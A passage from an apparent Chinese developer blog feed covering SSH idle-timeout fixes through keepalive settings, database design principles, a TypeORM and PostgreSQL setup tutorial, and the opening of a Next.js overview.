...</span></span><br></pre></td></tr></table></figure><p>本以为是ssh自动断开超时连接的，但通过配置看到，默认值中并没有做任何限制，那么理论上，ssh的连接是不会断开的。那到底是谁，干了这件<code>「坏事」</code>？</p><h2 id="2-线索"><a href="#2-线索" class="headerlink" title="2.线索"></a>2.线索</h2><p>既然是这样，为何公司电脑和家里的电脑变现不同呢？</p><blockquote><p>最后通过各种摸索，终于知道了问题的主要原因，因为连接是可以的，只是会超时断开，根据网络结构来看，问题就可能出现在一下这几个部分：<br>1. 服务器存在防火墙，会关闭超时空闲连接，或设置了关闭超时空闲连接。<br>2. 客服端和服务器之间存在路由器，路由器也可能带有防火墙，会关闭超时空闲连接。<br>3. 客服端存在防火墙，会关闭超时空闲连接。</p></blockquote><p>原来，问题出在防火墙！！</p><h2 id="3-深究"><a href="#3-深究" class="headerlink" title="3.深究"></a>3.深究</h2><p>为什么会是防火墙呢？在iptables的一些NAT配置说明里有提到——</p><blockquote><p>4.3.6 State match 状态匹配扩展要有内核里的连接跟踪代码的协助，因为它是从连接跟踪机制中得到包的状态的。这样我们就可以了解连接所处的状态。它几乎适用于所有的协议，包括那些无状态的协议，如ICMP和UDP。<strong>针对每个连接都有一个缺省的超时值，如果连接的时间超过了这个值，那么这个连接的记录就被会从连接跟踪的记录数据库中删除，也就是说连接就不再存在了。</strong>这个match必须有-m state作为前提才能使用。状态机制的详细内容在章节状态机制中。</p></blockquote><blockquote><p>NAT firewalls like to time out idle sessions to keep their state tables clean and their memory footprint low.<br><strong>NAT防火墙喜欢对空闲的会话进行超时处理，以确保它们状态表的干净和内存的低占用率。</strong><br>Some firewalls are nice, and let you idle for up to a day or so; some are gestapo and terminate your session after 5 minutes.<br><strong>一些防火墙比较友好，允许你的空闲会话时间为一天甚至超过一天；另一些却如盖世太保，5分钟空闲就终止你的会话。</strong></p></blockquote><p>通过ssh连接后，客户端和服务端长时间没响应时，在两方机器设置中均没任何限制，但在各自的防火墙，或是中转网络连接路由的防火墙中，出现了<code>「闲置超时断开」</code>的缺省机制！</p><h2 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4.解决方法"></a>4.解决方法</h2><h4 id="1、修改服务端配置（不建议）"><a href="#1、修改服务端配置（不建议）" class="headerlink" title="1、修改服务端配置（不建议）"></a>1、修改服务端配置（不建议）</h4><p><img src="/Blog/2020/08/08/essay/Linux%E4%BD%BF%E7%94%A8ssh%E8%B6%85%E6%97%B6%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0/index/img.png"></p><p><code>TCPKeepAlive yes</code> #表示TCP保持连接不断开<br><code>ClientAliveInterval 300</code> #指定服务端向客户端请求消息的时间间隔，单位是秒，默认是0，不发送。设置个300表示5分钟发送一次（注意，这里是服务端主动发起），然后等待客户端响应，成功，则保持连接。<br><code>ClientAliveCountMax 3</code> #指服务端发出请求后客户端无响应则自动断开的最大次数。使用默认给的3即可。<br>（注意：<code>TCPKeepAlive</code> 必须打开，否则直接影响后面的设置。<code>ClientAliveInterval</code> 设置的值要小于各层防火墙的最小值，不然，也就没用了。）</p><p>注意：最后要重启sshd服务才生效<br><code>sudo /etc/init.d/ssh restart</code></p><p>修改服务端的配置往往会比较麻烦，也涉及到权限问题，以及安全问题。还是比较推荐下面的方法。</p><h4 id="2、修改客户端配置"><a href="#2、修改客户端配置" class="headerlink" title="2、修改客户端配置"></a>2、修改客户端配置</h4><p><code>vim ~/.ssh/config</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span> *</span><br><span class="line">    <span class="attribute">ServerAliveInterval</span> <span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Host *</code> #表示需要启用该规则的服务端（域名或ip）<br><code>ServerAliveInterval 60</code> #表示没60秒去给服务端发起一次请求消息（这个设置好就行了）<br><code>ServerAliveCountMax 3</code> #表示最大连续尝试连接次数（这个基本不用设置）</p><h4 id="3、修改连接工具的配置"><a href="#3、修改连接工具的配置" class="headerlink" title="3、修改连接工具的配置"></a>3、修改连接工具的配置</h4><p>通过改变连接工具的一些默认配置，把keepalive的配置打开起来即可：</p><ul><li>secureCRT：会话选项 - 终端 - 反空闲 - 发送NO-OP每xxx秒，设置一个非0值。</li><li>putty：Connection - Seconds between keepalive(0 to turn off)，设置一个非0值。</li><li>iTerm2：profiles - sessions - When idle - send ASCII code.</li><li>XShell：session properties - connection - Keep Alive - Send keep alive message while this session connected. Interval [xxx] sec.</li></ul><blockquote><p>当然，用这个办法的副作用也是有的，比如iTerm2会出现一些并不想输入的字符、vim会有些多余字符插入等等，这些情况就按个人的需要酌情取舍了。</p></blockquote><h4 id="4、连接参数-o"><a href="#4、连接参数-o" class="headerlink" title="4、连接参数-o"></a>4、连接参数-o</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> -o ServerAliveInterval=<span class="number">30</span> root<span class="variable">@host</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库设计与搭建</title>
      <link href="/Blog/2020/07/24/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%90%AD%E5%BB%BA/index/"/>
      <url>/Blog/2020/07/24/javascript/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E4%B8%8E%E6%90%AD%E5%BB%BA/index/</url>
      
        <content type="html"><![CDATA[<h1 id="增删改查难在哪？"><a href="#增删改查难在哪？" class="headerlink" title="增删改查难在哪？"></a>增删改查难在哪？</h1><h2 id="一、开发效率"><a href="#一、开发效率" class="headerlink" title="一、开发效率"></a>一、开发效率</h2><ul><li>很多人做了五年 CRUD，开发效率始终没有变</li><li>如何能做到快速开发？</li></ul><h2 id="二、代码质量"><a href="#二、代码质量" class="headerlink" title="二、代码质量"></a>二、代码质量</h2><ul><li>为何互联网公司的代码大部分都是<strong>屎山</strong>，难以维护</li><li>2000 年左右就兴起的单元测试技术，为何还不会用</li><li>宣称敏捷开发，是否知道敏捷开发包涵单元测试</li></ul><h2 id="三、前后端联调"><a href="#三、前后端联调" class="headerlink" title="三、前后端联调"></a>三、前后端联调</h2><ul><li>为何后端给出的接口前端总是无法流畅使用，非得联调</li><li>前后端代码交给两个人增加的沟通成本是否值得## 四、伸缩性 Scale</li><li>数据量变大之后，应用是否还能正常运行</li><li>业务量增加之后，机器性能是否还抗的住，怎么加机器</li></ul><h2 id="五、高并发-C10k-problem"><a href="#五、高并发-C10k-problem" class="headerlink" title="五、高并发 C10k problem"></a>五、高并发 C10k problem</h2><ul><li>如果 10000 个连接同时进来，怎么保证服务质量（<a href="https://www.zhihu.com/question/54895548">何如设计秒杀系统</a>）</li></ul><h2 id="六、安全性与稳定性"><a href="#六、安全性与稳定性" class="headerlink" title="六、安全性与稳定性"></a>六、安全性与稳定性</h2><ul><li>怎么防脱发、MD5 碰撞？怎么防 XSS、CSRF、Replay？</li><li>怎么备份数据？怎么双活？</li></ul><h2 id="七怎么防脱发、颈椎病、肾结石"><a href="#七怎么防脱发、颈椎病、肾结石" class="headerlink" title="七怎么防脱发、颈椎病、肾结石"></a>七怎么防脱发、颈椎病、肾结石</h2><h1 id="一些重要的原则"><a href="#一些重要的原则" class="headerlink" title="一些重要的原则"></a>一些重要的原则</h1><h2 id="过早优化乃万恶之源"><a href="#过早优化乃万恶之源" class="headerlink" title="过早优化乃万恶之源"></a>过早优化乃万恶之源</h2><ul><li>Permature optimization is the root of all evil</li><li>如果你没有办法量化性能，就不要尝试优化性能</li></ul><h2 id="开发效率-gt-可读性-gt-运行效率"><a href="#开发效率-gt-可读性-gt-运行效率" class="headerlink" title="开发效率 &gt; 可读性 &gt; 运行效率"></a>开发效率 &gt; 可读性 &gt; 运行效率</h2><ul><li>对于初创公司，最重要的事情就是活下去</li><li>80% 以上对的中国创业公司活不过三年</li></ul><h2 id="可用性-gt-易用性-gt-美观"><a href="#可用性-gt-易用性-gt-美观" class="headerlink" title="可用性 &gt; 易用性 &gt; 美观"></a>可用性 &gt; 易用性 &gt; 美观</h2><ul><li>不要一开始就在易用性和美观上浪费太多时间</li></ul><h2 id="永远不要删除数据（敏感数据除外）"><a href="#永远不要删除数据（敏感数据除外）" class="headerlink" title="永远不要删除数据（敏感数据除外）"></a>永远不要删除数据（敏感数据除外）</h2><ul><li>尽量软删除，删除前确认</li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 TypeORM</title>
      <link href="/Blog/2020/07/22/javascript/%E4%BD%BF%E7%94%A8TypeORM/index/"/>
      <url>/Blog/2020/07/22/javascript/%E4%BD%BF%E7%94%A8TypeORM/index/</url>
      
        <content type="html"><![CDATA[<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><ul><li>默认支持 TypeScript</li><li>我们来打算用 Sequelize.js，发现他 <a href="https://stackoverflow.com/questions/59719330/sequelize-with-typescript-doesnt-resolve-type-correctly/62014646">对 TS 支持不够好</a></li><li>支持关联（Associations）</li><li>支持事务（Transaction）</li><li>支持数据库迁移（Migration）</li></ul><h1 id="启动数据库-postgresql"><a href="#启动数据库-postgresql" class="headerlink" title="启动数据库 postgresql"></a>启动数据库 postgresql</h1><h2 id="新版-docker（额外）"><a href="#新版-docker（额外）" class="headerlink" title="新版 docker（额外）"></a>新版 docker（额外）</h2><ul><li>在项目目录中创建 blog-data 目录</li><li>.gitignore 里添加 &#x2F;blog-data&#x2F;</li></ul><h1 id="启动-PostgreSQL"><a href="#启动-PostgreSQL" class="headerlink" title="启动 PostgreSQL"></a>启动 PostgreSQL</h1><ul><li>一句话启动</li><li>新版： <code>docker run -v &quot;$PWD/blog-data&quot;:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_USER=blog -e POSTGRES_HOST_AUTH_METHOD=trust -d postgres:12.2</code></li><li>旧版： <code>docker run -v &quot;blog-data&quot;:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_USER=blog -e POSTGRES_HOST_AUTH_METHOD=trust -d postgres:12.2</code></li><li>docker ps -a 这句话可以查看容器的运行状态</li><li>docker logs 容器id 这句话可以查看启动日志</li></ul><h1 id="验证-pg"><a href="#验证-pg" class="headerlink" title="验证 pg"></a>验证 pg</h1><h2 id="进入-docker-容器"><a href="#进入-docker-容器" class="headerlink" title="进入 docker 容器"></a>进入 docker 容器</h2><ul><li>docker exec -it 容器id bash</li></ul><h2 id="进入-pg-命令行"><a href="#进入-pg-命令行" class="headerlink" title="进入 pg 命令行"></a>进入 pg 命令行</h2><ul><li>psql -U blog -W</li><li>由于上面没有设置密码，所以直接回车即可</li><li><em>如果需要密码，可在docker run 选项里的 -e POSTGRES_HOST_AUTH_METHOD&#x3D;trust 替换成 -e POSTGRES_PASSWORD&#x3D;123456</em></li></ul><h2 id="一些简单的命令"><a href="#一些简单的命令" class="headerlink" title="一些简单的命令"></a>一些简单的命令</h2><ul><li>\l 用于 list databases，目前有一个  blog 数据库</li><li>\c 用于 connect to a database</li><li>\d 用于 display</li><li>\dt 用于 display tables，目前还没有</li></ul><h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><h2 id="用-SQL-来创建数据库"><a href="#用-SQL-来创建数据库" class="headerlink" title="用 SQL 来创建数据库"></a>用 SQL 来创建数据库</h2><ul><li><code>CREATE DATABASE xxx ENCODING &#39;UTF8&#39; LC_COLLATE &#39;en_US.utf8&#39; LC_CTYPE &#39;en_US.utf8&#39;;</code></li><li>因为 Type ORM 没有提供单纯创建数据库的 API</li><li>创建三个数据库：开发、测试、生产</li><li>对应英文 blog_development、blog_test、 blog_production</li><li>得到三个数据库</li></ul><h1 id="安装-TypeORM"><a href="#安装-TypeORM" class="headerlink" title="安装 TypeORM"></a>安装 TypeORM</h1><ul><li>打开官网，点击 Getting Started</li><li>安装该安装的依赖（typeorm reflect-metadata @types&#x2F;node pg）</li><li>不要使用 Quick Start 里面的 typeorm init 命令，因为他们改写你的现有项目的文件（后面自己改）</li><li>在 tsconfig.json 中加入 <code> &quot;emitDecoratorMetadata&quot;: true, &quot;experimentalDecorators&quot;: true,</code> 并更改成 <code>&quot;module&quot;: &quot;commonjs&quot;</code></li><li>创建 ormconfig.json，并加入内容（官网上有）</li></ul><h1 id="运行-TypeORM"><a href="#运行-TypeORM" class="headerlink" title="运行 TypeORM"></a>运行 TypeORM</h1><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><ul><li>Next.js 默认使用 babel 来将 TS 编译为JS（内置功能）</li><li>TypeORM 推荐使用 ts-node 来编译（没有内置）</li><li>babel 和 ts-node 对 TS 的支持并非完全一致</li><li>所以我们必须进行统一，全部都用 babel</li></ul><h2 id="安装-babel"><a href="#安装-babel" class="headerlink" title="安装 babel"></a>安装 babel</h2><ul><li>安装  @babel&#x2F;cli</li><li>创建 src&#x2F;index.ts<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// <span class="keyword">index</span>.ts</span><br><span class="line"><span class="keyword">import</span> &quot;reflect-metadata&quot;;</span><br><span class="line"><span class="keyword">import</span> &#123;createConnection&#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line">createConnection().<span class="keyword">then</span>(async <span class="keyword">connection</span> =&gt; &#123;</span><br><span class="line">  console.log(<span class="keyword">connection</span>)</span><br><span class="line">  await <span class="keyword">connection</span>.<span class="keyword">close</span>()</span><br><span class="line">&#125;).catch(error =&gt; console.log(error));</span><br></pre></td></tr></table></figure></li><li>npx babel .&#x2F;src –out-dir dist –extensions “.ts,.tsx”</li><li>node dist&#x2F;index.js</li><li>控制台成功打印出 connection 对象，连接数据库成功！</li></ul><h1 id="此时项目运行流程"><a href="#此时项目运行流程" class="headerlink" title="此时项目运行流程"></a>此时项目运行流程</h1><ul><li>统一让 Next.js 和 TypeORM 使用 babel 翻译 TS</li><li>每次修改 src 的 TS 代码后，翻译为 dist 里的 JS</li><li>使用 node 运行 dist 里的 JS，执行 TypeORM 任务</li><li>也可使用 Next.js 执行 TypeORM 任务（后面弄）</li></ul><p><img src="/Blog/2020/07/22/javascript/%E4%BD%BF%E7%94%A8TypeORM/index/img.png"></p><h1 id="重要配置：禁用-sync"><a href="#重要配置：禁用-sync" class="headerlink" title="重要配置：禁用 sync"></a>重要配置：禁用 sync</h1><h2 id="ormconfig"><a href="#ormconfig" class="headerlink" title="ormconfig"></a>ormconfig</h2><ul><li>“synchronize”: true &#x3D;&gt; false</li><li>如果为 true，那么在连接数据库时，typeorm 会自动根据 entity 目录来修改数据表</li><li>假设 entity 里面有 User，就会自动创建 User 表</li></ul><h3 id="看起来很方便，为什么要禁用"><a href="#看起来很方便，为什么要禁用" class="headerlink" title="看起来很方便，为什么要禁用"></a>看起来很方便，为什么要禁用</h3><ul><li>因为 sync 功能可能会在我们修改User 时直接删除数据</li><li>假设你把 user 表中的 name 字段改为了 nickname，他可能会误解你删除了 name，并新增了 nickname，此时表中 name 数据已经丢失</li><li>这种行为绝对不能发生在生产环境</li><li>所以我们要一开始就杜绝 sync 功能</li></ul><h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><h2 id="posts表"><a href="#posts表" class="headerlink" title="posts表"></a>posts表</h2><ul><li><a href="https://typeorm.io/#/migrations">使用命令行来创建</a></li><li>首先在 ormconfig 中加入以下代码，控制文件生成的目录<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;cli&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;migrationsDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;src/migration&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li>npx typeorm migration:create -n CreatePosts</li><li>在新生成的文件中 up 方法代表升级数据库，down 代表降级数据库<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import &#123;MigrationInterface, QueryRunner, Table&#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line">export <span class="class"><span class="keyword">class</span> <span class="title">CreatePosts1595341120888</span> <span class="keyword">implements</span> <span class="title">MigrationInterface</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> async <span class="title function_ invoke__">up</span>(<span class="attr">queryRunner</span>: QueryRunner): Promise&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        await queryRunner.<span class="title function_ invoke__">createTable</span>(<span class="keyword">new</span> <span class="title class_">Table</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;posts&#x27;</span>,</span><br><span class="line">            <span class="attr">columns</span>: [</span><br><span class="line">                &#123;<span class="attr">name</span>: <span class="string">&#x27;id&#x27;</span>, <span class="attr">isGenerated</span>: <span class="literal">true</span>, <span class="attr">type</span>: <span class="string">&#x27;int&#x27;</span>, <span class="attr">isPrimary</span>: <span class="literal">true</span>, <span class="attr">generationStrategy</span>: <span class="string">&quot;increment&quot;</span>&#125;,</span><br><span class="line">                &#123;<span class="attr">name</span>: <span class="string">&#x27;title&#x27;</span>, <span class="attr">type</span>: <span class="string">&#x27;varchar&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="attr">name</span>: <span class="string">&#x27;content&#x27;</span>, <span class="attr">type</span>: <span class="string">&#x27;text&#x27;</span>&#125;,</span><br><span class="line">                &#123;<span class="attr">name</span>: <span class="string">&#x27;author_id&#x27;</span>, <span class="attr">type</span>:<span class="string">&#x27;int&#x27;</span>&#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> async <span class="title function_ invoke__">down</span>(<span class="attr">queryRunner</span>: QueryRunner): Promise&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        await queryRunner.<span class="title function_ invoke__">dropTable</span>(<span class="string">&#x27;posts&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>npx babel .&#x2F;src –out-dir dist –extensions “.ts,.tsx”</li><li>由于我们使用 babel，与 TypeORM 官方建议用的 ts-node 不一样，所以我们还需要修改 ormconfig.json 文件，把 entities、migrations、subscribers，里面的路径都替换为 dist&#x2F;xxx&#x2F;**&#x2F;*.js<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;entities&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;dist/entity/**/*.js&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;migrations&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;dist/migration/**/*.js&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;subscribers&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;dist/subscriber/**/*.js&quot;</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure></li><li>npx typeorm migration:run</li><li>运行成功</li><li>我们就可以看到数据库中已经有 posts 表了</li></ul><p><img src="/Blog/2020/07/22/javascript/%E4%BD%BF%E7%94%A8TypeORM/index/img_1.png"></p><h1 id="每次都要运行-babel-不傻吗？"><a href="#每次都要运行-babel-不傻吗？" class="headerlink" title="每次都要运行 babel 不傻吗？"></a>每次都要运行 babel 不傻吗？</h1><ul><li>npx babel –help 可以看到有 -w 选项</li><li>这样我们每次更改文件 babel 就会自动编译</li><li>但是此时我们需要开三个窗口来运行我们的项目，第一跑 next dev，第二个跑 babel，第三个输入当前命令</li><li>所以有没有办法让第一个窗口和第二个窗口合并呢？</li><li>Linux &#x2F; Mac 用户直接使用 <strong>&amp;</strong> 即可， <code>next dev &amp; babel -w ....</code></li><li>但是 Windows 不支持（&amp;&amp; 的意思是如果前一个命令成功了，就执行下一个命令，此时不适用）</li><li>通过搜索关键词 npm run tasks in paraller</li><li>发现 concurrently 可以代替 &amp; 操作，安装根据文档操作即可</li></ul><h1 id="数据映射到实体"><a href="#数据映射到实体" class="headerlink" title="数据映射到实体"></a>数据映射到实体</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul><li>刚刚只是在数据库里创建了 posts，代码如何读写 posts 呢？</li><li>答案：将数据映射到 Entity（实体）</li><li>和 migration 一样首先在 ormconfig 中加入以下代码，控制文件生成的目录<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;cli&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;entitiesDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;src/entity&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li>npx typeorm entity:create -n Post<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Column, CreateDateColumn, Entity, PrimaryGeneratedColumn, UpdateDateColumn&#125; from <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity(<span class="string">&#x27;posts&#x27;</span>)</span></span><br><span class="line">export <span class="keyword">class</span> <span class="title class_">Post</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn(<span class="string">&#x27;increment&#x27;</span>)</span></span><br><span class="line">  id: number;</span><br><span class="line">  <span class="meta">@Column(<span class="string">&#x27;varchar&#x27;</span>)</span></span><br><span class="line">  title: string;</span><br><span class="line">  <span class="meta">@Column(<span class="string">&#x27;text&#x27;</span>)</span></span><br><span class="line">  content: string;</span><br><span class="line">  <span class="meta">@Column(<span class="string">&#x27;int&#x27;</span>)</span></span><br><span class="line">  authorId: number;</span><br><span class="line">  <span class="meta">@CreateDateColumn()</span></span><br><span class="line">  createdAt: Date;</span><br><span class="line">  <span class="meta">@UpdateDateColumn()</span></span><br><span class="line">  updatedAt: Date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>编译时遇到一个报错 <code>syntax &#39;decorators-legacy&#39;</code></li><li>搜索以后，安装 <code>yarn add -D @babel/plugin-proposal-decorators</code></li><li>根据 Next.js 的要求，新建 .babelrc 文件，并加入上面安装的插件<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;presets&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;next/babel&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;plugins&quot;</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&quot;@babel/plugin-proposal-decorators&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;legacy&quot;</span>: true</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>@PrimaryGeneratedColumn(‘increment’) &#x2F;&#x2F; 自增主键</li><li>@Column(‘varchar’) &#x2F;&#x2F; varchar 类型</li><li>@Column(‘text’) &#x2F;&#x2F; text 类型</li></ul><h2 id="如何使用实体"><a href="#如何使用实体" class="headerlink" title="如何使用实体"></a>如何使用实体</h2><ul><li><a href="https://typeorm.io/#/working-with-entity-manager">EntityManager</a> 或 <a href="https://typeorm.io/#/working-with-repository">Repository</a></li><li>这只是两种不同的封装思路而已，需要灵活使用</li></ul><h3 id="EntityManager-API"><a href="#EntityManager-API" class="headerlink" title="EntityManager API"></a>EntityManager API</h3><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><ul><li>await manager.find(Post, { title: ‘第一篇博客’ })</li><li>await manager.create(Post, { title: ‘…..’ })</li><li>await manager.save(post1)</li><li>await manager.save([post1, post2, post3])</li><li>await manager.remove(post1)</li><li>await manager.update(Post, 1, { title: ‘修改后的标题’ })</li><li>await manager.delete(Post, 1)</li><li>await manager.findOne(Post, 1)</li></ul><h4 id="封装思路"><a href="#封装思路" class="headerlink" title="封装思路"></a>封装思路</h4><ul><li>把所有操作都放在 manager 上</li><li>把 Post 类、post1 对象和其他参数传给 manager</li></ul><h3 id="Repository-API"><a href="#Repository-API" class="headerlink" title="Repository API"></a>Repository API</h3><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><ul><li>const postRepository &#x3D; getRepository(Post)</li><li>await postRepository .findOne(1)</li><li>await postRepository .save(post)</li></ul><h4 id="封装思路-1"><a href="#封装思路-1" class="headerlink" title="封装思路"></a>封装思路</h4><ul><li>先通过Post 构造一个 repo 对象</li><li>这个 repo 对象就只操作 posts 表了</li></ul><h4 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h4><ul><li><a href="https://typeorm.io/#/tree-entities">TreeRepository</a> 和 MongoRepository</li><li>目前用不到这两个功能，所以就先不用Repo API</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="migration-数据迁移"><a href="#migration-数据迁移" class="headerlink" title="migration 数据迁移"></a>migration 数据迁移</h2><ul><li>用来对数据库升级和降级</li></ul><h2 id="entity-实体"><a href="#entity-实体" class="headerlink" title="entity 实体"></a>entity 实体</h2><ul><li>用类和对象操作数据表和数据行</li></ul><h2 id="connection-连接"><a href="#connection-连接" class="headerlink" title="connection 连接"></a>connection 连接</h2><ul><li>一个数据库连接，默认最多 10 个连接</li><li>这种模式也叫做连接池，可以参考<a href="https://juejin.im/post/5af026a06fb9a07ac47ff282">这篇文章</a></li></ul><h2 id="manager-x2F-repo"><a href="#manager-x2F-repo" class="headerlink" title="manager &#x2F; repo"></a>manager &#x2F; repo</h2><ul><li>两种 API 封装风格，用于操作 entity</li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Next 全解</title>
      <link href="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/"/>
      <url>/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Next-js-的背景"><a href="#Next-js-的背景" class="headerlink" title="Next.js 的背景"></a>Next.js 的背景</h1><h2 id="开发团队是-zeit"><a href="#开发团队是-zeit" class="headerlink" title="开发团队是 zeit"></a>开发团队是 zeit</h2><ul><li>zeit 团队<a href="https://www.zhihu.com/question/59278159/answer/813629215">水平</a>如何。后改名为 Vercel</li><li>简言之，一个高中开始编程的、会做平面设计的复旦大学计算机专业毕业生，在微软工作一年后，加入了 zeit 团队</li><li>几乎每一个同事都有非常强大的背景</li><li>Next,js 核心团队四个人平均年龄 20岁</li><li>按 star 数，zeit 是 GitHub 组织的 Top 20</li><li>全员远程工作</li></ul><h1 id="Next-js-的定位"><a href="#Next-js-的定位" class="headerlink" title="Next.js 的定位"></a>Next.js 的定位</h1><h2 id="Node-js-全栈框架"><a href="#Node-js-全栈框架" class="headerlink" title="Node.js 全栈框架"></a>Node.js 全栈框架</h2><ul><li>CSS-inJS</li><li>页面预渲染 + SSR（服务端渲染）</li><li>前后端同构（代码同时运行在两端）</li><li>Node.js 10.13 以上</li><li>支持 React，与 React 无缝对接</li><li>支持 TypeScript</li></ul><h2 id="弱项"><a href="#弱项" class="headerlink" 